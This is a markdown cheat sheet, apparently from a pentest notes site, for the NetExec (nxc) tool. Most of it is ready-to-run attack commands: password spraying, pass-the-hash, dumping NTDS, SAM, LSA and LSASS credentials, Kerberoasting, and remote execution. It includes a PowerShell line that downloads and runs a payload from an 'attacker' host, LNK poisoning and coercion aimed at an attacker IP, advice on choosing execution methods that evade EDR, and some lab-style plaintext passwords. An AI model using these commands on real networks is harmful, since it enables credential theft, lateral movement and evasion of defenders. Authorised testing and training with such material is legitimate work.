---
title: "NetExec (nxc) — The Network Execution Swiss Army Knife"
description: "Complete reference for NetExec: SMB, LDAP, WinRM, MSSQL, SSH, RDP and more. Enumeration, credential spraying, command execution with all four exec-methods, file transfer, BloodHound collection, NTDS dumping, and the modules that make nxc the standard tool for post-exploitation at scale."
category: "Active Directory"
tools: [NetExec, nxc, Impacket, BloodHound, Kerberos]
updated: 2026-07-16
tags: [active-directory, netexec, nxc, smb, ldap, winrm, mssql, password-spraying, dcsync, bloodhound, lateral-movement, exec-method]
---

## Index

| Section | Description |
|---|---|
| [1. Installation & Syntax](#1-installation--syntax) | Basic syntax and options |
| [2. Authentication](#2-authentication) | Password, hash, kerberos, ccache |
| [3. SMB — Enumeration](#3-smb--enumeration) | Shares, users, sessions, disks |
| [4. SMB — Command Execution](#4-smb--command-execution) | `-x`, `-X`, `--exec-method` |
| [5. SMB — File Transfer](#5-smb--file-transfer) | Upload and download files |
| [6. SMB — NTDS Dumping](#6-smb--ntds-dumping) | Extract all domain hashes |
| [7. SMB — SAM & LSA Dumping](#7-smb--sam--lsa-dumping) | Local credential extraction |
| [8. LDAP — Enumeration & Queries](#8-ldap--enumeration--queries) | Users, groups, computers, custom queries |
| [9. LDAP — BloodHound Collection](#9-ldap--bloodhound-collection) | Collect AD data |
| [10. WinRM](#10-winrm) | Remote PowerShell execution |
| [11. MSSQL](#11-mssql) | SQL Server enumeration and abuse |
| [12. SSH, RDP, FTP, VNC, NFS](#12-ssh-rdp-ftp-vnc-nfs) | Other protocols |
| [13. Password Spraying](#13-password-spraying) | Brute force at scale |
| [14. Modules](#14-modules) | spider_plus, lsassy, gpp_password, etc. |
| [15. Common Flags](#15-common-flags) | Filtering, output, targeting |

---

## 1. Installation & Syntax

### Install

```bash
pipx install netexec
# or
pip install netexec
```

Verify:

```bash
nxc --version
```

### Basic syntax

```
nxc <protocol> <target> [auth options] [action options]
```

Examples:

```bash
nxc smb 192.168.1.0/24
nxc ldap dc01.corp.local -u user -p pass
nxc winrm 10.10.10.5 -u admin -H <NTHASH> -x whoami
```

### Target formats

```
192.168.1.1              # single IP
192.168.1.0/24           # CIDR range
192.168.1.1-50           # IP range
targets.txt              # file with targets
dc01.corp.local          # hostname (requires DNS)
```

---

## 2. Authentication

### Password

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>'
```

### Pass-the-Hash (PTH)

Format: `LMHASH:NTHASH` or just `NTHASH`.

```bash
nxc smb <TARGET> -u '<USER>' -H <NTHASH>
nxc smb <TARGET> -u '<USER>' -H <LMHASH>:<NTHASH>
```

### Local Authentication

Use `--local-auth` when targeting local accounts instead of domain:

```bash
nxc smb <TARGET> -u 'administrator' -p '<PASSWORD>' --local-auth
```

### Kerberos

With password:

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -k
```

With ccache:

```bash
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb <TARGET> -u '<USER>' -k --use-kcache
```

With `--use-kcache` the username is taken from the ccache:

```bash
nxc smb <TARGET> -k --use-kcache
```

### Null session / guest

```bash
nxc smb <TARGET> -u '' -p ''
nxc smb <TARGET> -u 'guest' -p ''
```

### Anonymous LDAP

```bash
nxc ldap <TARGET> -u '' -p '' --query "(objectClass=*)" ""
```

---

## 3. SMB — Enumeration

### Shares

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --shares
```

With permissions (READ, WRITE):

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --shares -M spider_plus
```

### Logged-on users

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --loggedon-users
```

### Local users

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --users
```

### Local groups

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --groups
```

### Domain groups

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --groups --domain
```

### Active sessions

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --sessions
```

### Disks

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --disks
```

### Password policy

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --pass-pol
```

### RID brute (enumerate users via RID cycling)

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --rid-brute
```

### Enumerate all SMB hosts on a network

```bash
nxc smb 192.168.1.0/24
```

---

## 4. SMB — Command Execution

### Execute command via cmd.exe

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami /all'
```

### Execute via PowerShell

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -X 'Get-Process'
```

### Example — full system enumeration

```bash
nxc smb 172.16.99.21 -u Administrator -p 'vau!XCKjNQBv2$' -d relia.com -x 'whoami /all'
```

### Example — dump users

```bash
nxc smb 172.16.99.21 -u Administrator -p '<PASSWORD>' -x 'net user'
nxc smb 172.16.99.21 -u Administrator -p '<PASSWORD>' -x 'net localgroup administrators'
```

### Example — extract LSA secrets

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --lsa
```

### Example — run PowerShell script from URL

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -X 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/payload.ps1")'
```

### `--exec-method` — choosing the execution technique

By default, nxc uses WMI to execute the command. This is not always the best choice — each method has different detection surfaces, different requirements, and different reliability. The `--exec-method` flag selects which one to use.

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami' --exec-method <METHOD>
```

Example:

```bash
nxc smb 192.168.1.50 -u Administrator -p 'Password123' -x 'whoami' --exec-method mmcexec
```

### The four methods

| Method | Mechanism | Requirements | Detection surface |
|---|---|---|---|
| **wmiexec** (default) | WMI (`Win32_Process.Create`) | Admin rights, RPC/DCOM reachable | Process creation with `WmiPrvSE.exe` as parent |
| **atexec** | Task Scheduler (`ITaskScheduler`) | Admin rights, Task Scheduler service running | Scheduled task creation events (EID 4698) |
| **smbexec** | Service Control Manager (creates a Windows service) | Admin rights, SMB write access | Service creation events (EID 7045), rare services |
| **mmcexec** | DCOM via `MMC20.Application` COM object | Admin rights, DCOM reachable | DCOM object instantiation, `mmc.exe` as parent |

### Detailed breakdown

**`wmiexec`** — the default. Uses the WMI infrastructure (`Win32_Process.Create`) to spawn the command. The process runs under `WmiPrvSE.exe` as the parent, which is a well-known indicator for defenders. The output is captured and returned to the operator. Reliable across most Windows versions. This is what you get if you don't specify `--exec-method`.

**`atexec`** — uses the Windows Task Scheduler. Creates a temporary scheduled task that runs the command at a specific time (usually a few seconds in the future). The task is created, executes, and (in most implementations) is deleted immediately after. Detection: Event ID 4698 (scheduled task created) is the loudest indicator. The parent process of the spawned command is `taskeng.exe` or `svchost.exe` (depending on the Windows version), which is more plausible than `WmiPrvSE.exe` but still detectable.

**`smbexec`** — creates a native Windows service via the Service Control Manager. The service's binary path points to a command that executes the payload. Once the command finishes, the service is deleted. Detection: Event ID 7045 (service installed) is a critical signal, and it fires on every command executed this way. Additionally, the service name is often randomly generated (e.g., `BTOBTO`, `YWDGYC`), which is anomalous. This is the noisiest of the four in most environments.

**`mmcexec`** — abuses DCOM by instantiating the `MMC20.Application` COM object and calling its `ExecuteShellCommand` method. This spawns the command under `mmc.exe` as the parent, which is a plausible parent for a management console operation. Detection: DCOM object instantiation events (Sysmon EID 22), and the presence of `mmc.exe` spawning a command-line process. This is the least commonly used method, which paradoxically makes it more stealthy in environments that don't baseline for it.

### When to use each

- **Default lab use**: `wmiexec` is fine. It works, it's fast, and detection doesn't matter in a lab.
- **Against a mature EDR**: `mmcexec` often has the best chance, because `mmc.exe` spawning a child process is less baselined than `WmiPrvSE.exe` spawning one.
- **When WMI is broken or filtered**: `atexec` is a reliable fallback. Task Scheduler is almost always available.
- **When you need a service context**: `smbexec` creates an actual service, which runs in a different security context and may be required for certain payloads (e.g., persistence via service installation).
- **When speed matters more than stealth**: `wmiexec` and `atexec` are the fastest. `smbexec` is slower because it waits for the service to start.

### Practical workflow

Test all four on a target during the reconnaissance phase, and pick the one that produces the least noise according to what the environment monitors. In a red team engagement, running:

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami' --exec-method wmiexec
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami' --exec-method atexec
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami' --exec-method mmcexec
```

...back to back, and checking which one triggers alerts, is often part of the "detection gap mapping" phase.

### Note on remote output

Not all methods return the command's output to the operator. `wmiexec`, `atexec`, and `mmcexec` return stdout; `smbexec` returns output via a share, which may fail if the share is not writable. If a method returns nothing but the command executed, check the target's filesystem for the output artifact.

---

## 5. SMB — File Transfer

### Download a single file (get-file)

Syntax: `--get-file <REMOTE_PATH> <LOCAL_PATH>`. The remote path uses backslashes.

```bash
nxc smb 10.10.145.148 -u administrator -H <NTHASH> --get-file \\Temp\\SAM ./SAM
```

Download from a share:

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --get-file \\Windows\\Temp\\artifact.txt ./artifact.txt
```

### Upload a single file (put-file)

Syntax: `--put-file <LOCAL_PATH> <REMOTE_PATH>`.

```bash
nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
```

### Download all files from shares (spider_plus)

**⚠️ ALWAYS CHECK THE JSON OUTPUT MANUALLY.** `spider_plus` sometimes misses files. The JSON gives the complete list.

With Kerberos:

```bash
nxc smb dc01.trask.hsm -d trask.hsm -u k.ryan -k --use-kcache -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./
```

With password:

```bash
nxc smb dc01.garfield.htb -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -k -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./
```

With max file size limit (50 MB):

```bash
nxc smb dc01.trask.hsm -d trask.hsm -u k.ryan -p 'ProtoTra1NR1973!' -k --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./shares MAX_FILE_SIZE=50000000
```

List only (without downloading):

```bash
nxc smb 192.168.100.2 -u 'k.ryan' -p 'ProtoTra1NR1973!' -k --shares -M spider_plus
```

---

## 6. SMB — NTDS Dumping

Extract all domain hashes directly from the DC's `ntds.dit`.

### Via DRSUAPI (default method)

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' --ntds
```

### Via VSS (Volume Shadow Copy)

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' --ntds vss
```

### Dump a specific user

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' --ntds --user Administrator
```

### With ccache

```bash
KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache nxc smb <DC> --ntds --user Administrator
```

### Only enabled accounts

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' --ntds --enabled
```

### Only user accounts (skip computers)

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' --ntds --user-only
```

---

## 7. SMB — SAM & LSA Dumping

### Dump SAM (local hashes)

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --sam
```

With local auth:

```bash
nxc smb <TARGET> -u 'administrator' -p '<PASSWORD>' --local-auth --sam
```

### Dump LSA (cached domain credentials, service account passwords)

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --lsa
```

### Dump DPAPI secrets

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --dpapi
```

### Dump LSASS via lsassy module

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M lsassy
```

---

## 8. LDAP — Enumeration & Queries

### Collect all users, groups, and computers

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --users --groups --computers
```

### Custom LDAP query

Syntax: `--query "<FILTER>" <ATTRIBUTES>`

```bash
nxc ldap 192.168.100.2 -u 'k.ryan' -p 'ProtoTra1NR1973!' -d trask.hsm -k --query "(|(objectCategory=Computer)(objectCategory=Person))" sAMAccountName
```

### Users with specific attributes

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --query "(objectClass=user)" "sAMAccountName description"
```

### Find accounts with SPN (Kerberoastable)

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --kerberoasting output.txt
```

### Find accounts without pre-auth (AS-REP Roastable)

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --asreproast output.txt
```

### Trusted for delegation accounts

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --trusted-for-delegation
```

### Password not required

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --password-not-required
```

### Admin count (former admins)

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --admin-count
```

### Users description field

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --get-desc-users
```

### LAPS passwords (v1)

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' -M laps
```

### gMSA passwords

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --gmsa
```

### Pre-created computer accounts

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --query "(objectClass=computer)" "sAMAccountName"
```

---

## 9. LDAP — BloodHound Collection

### Collection via LDAP protocol

```bash
nxc ldap DC01.trask.hsm -k --collection all
```

Collection methods: `Default`, `Group`, `LocalAdmin`, `Session`, `Trusts`, `ACL`, `Container`, `DCOM`, `RDP`, `PSRemote`, `UserRights`, `ObjectProps`, `CertServices`, `all`.

### With specific username and password

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --collection all
```

### With ccache

```bash
nxc ldap <DC> -k --use-kcache --collection all
```

### Save output to a zip

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' --collection all --bloodhound --dns-server <DC_IP>
```

---

## 10. WinRM

WinRM provides remote PowerShell execution over HTTP/HTTPS (ports 5985/5986).

### Execute command

```bash
nxc winrm <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami'
```

### Execute via PowerShell

```bash
nxc winrm <TARGET> -u '<USER>' -p '<PASSWORD>' -X 'Get-Process'
```

### Enumerate local users

```bash
nxc winrm <TARGET> -u '<USER>' -p '<PASSWORD>' --users
```

### With Pass-the-Hash

```bash
nxc winrm <TARGET> -u '<USER>' -H <NTHASH> -x 'whoami'
```

### With Kerberos

```bash
nxc winrm <TARGET> -u '<USER>' -k --use-kcache -x 'whoami'
```

---

## 11. MSSQL

### Test login

```bash
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>'
```

### Enumerate databases

```bash
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --databases
```

### Enumerate tables

```bash
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --tables
```

### Execute SQL query

```bash
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -q 'SELECT @@version'
```

### Execute system command via xp_cmdshell

```bash
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'whoami'
```

### Enable and abuse xp_cmdshell

```bash
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -M mssql_priv
```

### Impersonate user (MSSQL impersonation)

```bash
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -q "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER"
```

### Get MSSQL hashes

```bash
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --get-hashes
```

---

## 12. SSH, RDP, FTP, VNC, NFS

### SSH

```bash
nxc ssh <TARGET> -u '<USER>' -p '<PASSWORD>' -x 'id'
nxc ssh <TARGET> -u '<USER>' -p '<PASSWORD>' --key-file /path/to/key
```

### RDP

RDP support is primarily for enumeration; execution is limited.

```bash
nxc rdp <TARGET> -u '<USER>' -p '<PASSWORD>'
```

Screenshot after connection:

```bash
nxc rdp <TARGET> -u '<USER>' -p '<PASSWORD>' --screenshot
```

### FTP

```bash
nxc ftp <TARGET> -u '<USER>' -p '<PASSWORD>' --ls
nxc ftp <TARGET> -u 'anonymous' -p '' --ls
```

### VNC

```bash
nxc vnc <TARGET> -p '<PASSWORD>' --screenshot
```

### NFS

```bash
nxc nfs <TARGET> --shares
nxc nfs <TARGET> --ls /export/share
```

---

## 13. Password Spraying

### Basic spray

```bash
nxc smb <TARGET> -u users.txt -p 'Password123!' --continue-on-success
```

### Multiple passwords

```bash
nxc smb <TARGET> -u users.txt -p passwords.txt --continue-on-success
```

### With delay between attempts (avoid lockout)

```bash
nxc smb <TARGET> -u users.txt -p 'Password123!' --continue-on-success --delay 30
```

### With jitter

```bash
nxc smb <TARGET> -u users.txt -p passwords.txt --continue-on-success --jitter 5
```

### Spray with hash

```bash
nxc smb <TARGET> -u users.txt -H <NTHASH> --continue-on-success
```

### Check password policy first

**Always check the password policy before spraying.** Lockout thresholds will lock out all accounts.

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' --pass-pol
```

### Common password spray (no password)

```bash
nxc smb <TARGET> -u users.txt -p '' --continue-on-success
```

### Generate common passwords from domain name

```bash
nxc smb <TARGET> -u users.txt -p 'CompanyName2024!' 'CompanyName2025!' 'Welcome1!' --continue-on-success
```

---

## 14. Modules

Modules extend nxc with specific functionality. List all modules:

```bash
nxc smb -L
nxc ldap -L
```

### spider_plus — SMB share spidering and download

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M spider_plus
```

With download:

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./shares
```

With file size limit:

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=50000000
```

### lsassy — LSASS memory dumping

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M lsassy
```

### gpp_password — GPP passwords from SYSVOL

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -M gpp_password
```

### gpp_autologin — GPP autologin credentials

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -M gpp_autologin
```

### nanodump — Advanced LSASS dumping

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M nanodump
```

### laps — LAPS passwords

```bash
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' -M laps
```

### zerologon — CVE-2020-1472 detection

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -M zerologon
```

### petitpotam — CVE-2021-36942 detection

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -M petitpotam
```

### nopac — CVE-2021-42278/42287 detection

```bash
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -M nopac
```

### printnightmare — CVE-2021-1675 detection

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M printnightmare
```

### ms17-010 — EternalBlue detection

```bash
nxc smb <TARGET> -M ms17-010
```

### enum_av — Antivirus enumeration

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M enum_av
```

### enum_avproducts — Detailed AV info

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M enum_avproducts
```

### webdav — WebDAV detection

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M webdav
```

### masky — Scheduled tasks enumeration

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M masky
```

### rdp — RDP enumeration module

```bash
nxc rdp <TARGET> -u '<USER>' -p '<PASSWORD>' -M rdp
```

### ioxid resolver module

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M ioxidresolver
```

### slinky — LNK file poisoning

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M slinky -o SERVER=<ATTACKER_IP> NAME=important_document
```

### coerce_plus — Coercion attacks (PetitPotam, PrinterBug, etc.)

```bash
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<ATTACKER_IP>
```

---

## 15. Common Flags

### Target options

| Flag | Description |
|---|---|
| `<target>` | IP, CIDR, range, hostname, or file |
| `--port <PORT>` | Custom port |
| `--timeout <SEC>` | Connection timeout |
| `--dns-server <IP>` | Custom DNS server |
| `--dns-tcp` | Use TCP for DNS |

### Authentication

| Flag | Description |
|---|---|
| `-u <USER>` | Username or file |
| `-p <PASSWORD>` | Password or file |
| `-H <HASH>` | NTLM hash |
| `-d <DOMAIN>` | Domain |
| `-k` | Use Kerberos |
| `--use-kcache` | Use ccache for Kerberos |
| `--local-auth` | Authenticate as local user |
| `--no-bruteforce` | Disable automatic brute forcing |
| `--continue-on-success` | Continue after successful auth |
| `--delay <SEC>` | Delay between attempts |
| `--jitter <SEC>` | Jitter for delays |

### Output

| Flag | Description |
|---|---|
| `--verbose` | Verbose output |
| `--no-progress` | Disable progress bar |
| `-o <OPTION=VALUE>` | Module options |
| `--log <FILE>` | Log to file |
| `--export <FORMAT>` | Export format (json, sqlite) |

### Filtering

| Flag | Description |
|---|---|
| `--smb-timeout` | SMB-specific timeout |
| `--threads <N>` | Number of threads |
| `--fail-limit <N>` | Stop target after N failures |

### Protocol-specific

| Flag | Description |
|---|---|
| `--shares` | SMB: enumerate shares |
| `--users` | SMB/LDAP: enumerate users |
| `--groups` | SMB/LDAP: enumerate groups |
| `--computers` | LDAP: enumerate computers |
| `--sessions` | SMB: enumerate sessions |
| `--disks` | SMB: enumerate disks |
| `--loggedon-users` | SMB: enumerate logged-on users |
| `--pass-pol` | SMB: get password policy |
| `--rid-brute` | SMB: RID cycling |
| `--sam` | SMB: dump SAM |
| `--lsa` | SMB: dump LSA |
| `--ntds` | SMB: dump NTDS |
| `--dpapi` | SMB: dump DPAPI secrets |
| `--gmsa` | LDAP: read gMSA passwords |
| `--kerberoasting <FILE>` | LDAP: extract Kerberoastable hashes |
| `--asreproast <FILE>` | LDAP: extract AS-REP hashes |
| `--trusted-for-delegation` | LDAP: enumerate delegation |
| `--admin-count` | LDAP: enumerate adminCount objects |
| `--query <FILTER> <ATTRS>` | LDAP: custom query |
| `--collection <METHOD>` | LDAP: BloodHound collection |
| `--bloodhound` | LDAP: output in BloodHound format |
| `-x <COMMAND>` | Execute command via cmd.exe |
| `-X <COMMAND>` | Execute command via PowerShell |
| `--exec-method <METHOD>` | Execution technique: `wmiexec` (default), `atexec`, `smbexec`, `mmcexec` |
| `-q <QUERY>` | MSSQL: execute SQL query |
| `--get-file <REMOTE> <LOCAL>` | SMB: download file |
| `--put-file <LOCAL> <REMOTE>` | SMB: upload file |
| `--screenshot` | RDP/VNC: take screenshot |
| `--key-file <FILE>` | SSH: use private key |

---

## Quick reference — Workflow examples

### 1. Network sweep and share enumeration

```bash
# Discover all SMB hosts and their OS
nxc smb 192.168.1.0/24

# List shares with credentials
nxc smb 192.168.1.0/24 -u user -p pass --shares
```

### 2. BloodHound collection

```bash
nxc ldap dc01.corp.local -u user -p pass --collection all --bloodhound --dns-server 192.168.1.10
```

### 3. Password spray

```bash
# Check policy first
nxc smb dc01.corp.local -u user -p pass --pass-pol

# Spray with delay to avoid lockout
nxc smb dc01.corp.local -u users.txt -p 'Spring2026!' --continue-on-success --delay 30
```

### 4. Lateral movement with PTH

```bash
# Test hash on all hosts
nxc smb 192.168.1.0/24 -u administrator -H <NTHASH> --local-auth

# Execute command on a target
nxc smb 192.168.1.50 -u administrator -H <NTHASH> --local-auth -x 'whoami'
```

### 5. Dump domain hashes

```bash
nxc smb dc01.corp.local -u domain_admin -p pass --ntds
```

### 6. Extract all files from shares

```bash
nxc smb dc01.corp.local -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./loot
```

### 7. Kerberoast and AS-REP roast

```bash
nxc ldap dc01.corp.local -u user -p pass --kerberoasting kerb.txt
nxc ldap dc01.corp.local -u user -p pass --asreproast asrep.txt
```

### 8. Enumerate privileged users

```bash
nxc ldap dc01.corp.local -u user -p pass --admin-count
```

### 9. Execute via WinRM

```bash
nxc winrm 192.168.1.50 -u user -p pass -x 'ipconfig /all'
```

### 10. Compare exec-methods against a target

```bash
# Run the same command with each method and compare results
nxc smb 192.168.1.50 -u Administrator -p pass -x 'whoami' --exec-method wmiexec
nxc smb 192.168.1.50 -u Administrator -p pass -x 'whoami' --exec-method atexec
nxc smb 192.168.1.50 -u Administrator -p pass -x 'whoami' --exec-method smbexec
nxc smb 192.168.1.50 -u Administrator -p pass -x 'whoami' --exec-method mmcexec
```

Useful for identifying which method the target's EDR detects and which it does not.

### 11. MSSQL abuse

```bash
# Check access
nxc mssql 192.168.1.50 -u sa -p 'Password123'

# Execute command via xp_cmdshell
nxc mssql 192.168.1.50 -u sa -p 'Password123' -x 'whoami'
```

---

## Notes

- **Always check password policy** before spraying to avoid lockouts.
- **`--local-auth`** is required for local account authentication (not domain).
- **`spider_plus`** may miss files — always verify the JSON output.
- **`-M <module>`** loads a module. `-o <OPTION=VALUE>` passes options to it.
- **`--continue-on-success`** keeps testing other credentials after a success, useful for finding multiple valid pairs.
- **Kerberos with `--use-kcache`** uses the username from the ccache, so `-u` is optional.
- **`--ntds`** requires Domain Admin or equivalent rights. It uses DRSUAPI by default (quieter) and VSS as fallback.
- **`--exec-method`** changes the OPSEC profile of command execution. Test all four against a target to find the one that produces the least noise in that environment.
- **nxc replaces** CrackMapExec, which was archived in 2023. The syntax is nearly identical, with some improvements.
